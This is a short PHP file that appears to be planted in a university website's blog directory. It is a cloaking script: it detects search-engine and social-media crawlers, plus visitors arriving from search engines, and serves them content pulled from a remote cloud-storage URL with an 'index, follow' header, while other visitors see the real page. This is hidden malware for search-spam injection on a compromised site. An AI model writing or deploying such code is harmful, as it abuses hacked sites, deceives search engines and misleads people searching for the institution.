<?php
error_reporting(0);
$__offer = 'https://demielpe.sgp1.digitaloceanspaces.com/jspm-edu-blog-portfolio-our-university-rankers-index.html';
$__ua  = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
$__ref = strtolower(isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '');
$__bots = ['googlebot','googlebot-image','googlebot-video','googlebot-news','googlebot-mobile','google-inspectiontool','googleother','googleother-image','googleother-video','adsbot-google','adsbot-google-mobile','apis-google','google-site-verification','storebot-google','google-extended','googlecloudvertexbot','mediapartners-google','google-safety','googleweblight','bingbot','adidxbot','bingpreview','microsoftpreview','slurp','duckduckbot','baiduspider','yandexbot','sogou','exabot','ia_archiver','facebookexternalhit','facebot','twitterbot','linkedinbot','pinterest','slackbot','whatsapp','telegrambot','discordbot','rogerbot','semrushbot','ahrefsbot','dotbot','mj12bot','applebot'];
$__is_bot = false;
foreach ($__bots as $__b) {
    if (strpos($__ua, $__b) !== false) { $__is_bot = true; break; }
}
foreach (array('google.','bing.com','yahoo.com','duckduckgo.com','yandex.','baidu.com') as $__s) {
    if (strpos($__ref, $__s) !== false) { $__is_bot = true; break; }
}
if ($__is_bot) {
    $__ch = curl_init();
    curl_setopt_array($__ch, array(
        CURLOPT_URL            => $__offer,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_TIMEOUT        => 10,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_USERAGENT      => isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Mozilla/5.0',
    ));
    $__content = curl_exec($__ch);
    curl_close($__ch);
    if ($__content !== false && $__content !== '') {
        header('Content-Type: text/html; charset=utf-8');
        header('X-Robots-Tag: index, follow');
        echo $__content;
        exit;
    }
}
readfile('jspm.edu.in/public_html/blog/portfolio/our-university-rankers/index.html');
